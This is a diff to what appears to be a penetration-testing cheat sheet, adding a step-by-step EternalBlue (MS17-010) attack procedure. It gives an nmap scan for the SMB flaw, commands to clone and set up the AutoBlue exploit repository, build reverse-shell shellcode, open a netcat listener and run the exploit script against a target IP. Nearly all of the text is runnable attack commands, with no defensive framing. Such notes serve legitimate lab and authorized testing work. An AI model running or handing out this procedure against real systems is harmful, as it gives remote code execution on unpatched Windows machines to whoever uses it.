@@ -32,15 +32,27 @@ msf > set SMBPass <password>
 
 ## EternalBlue
 ```
---script=smb-vuln-ms17-010
+nmap -Pn -sV -p445 --script=smb-vuln-ms17-010 <ip>
+```
 
-gitclone autoblue 
-
-pip install -r requirements
+```
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+cd AutoBlue-MS17-010
+pip install -r requirements.txt
 
 cd shellcode
 chmod +x shell_prep.sh
 ./shell_prep.sh
 
-eternalblue
+y
+<ip>   
+<port>
+<port>
+1
+1
+
+nc -nvlp <port> ==> another tab
+
+cd ..
+python eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
 ```
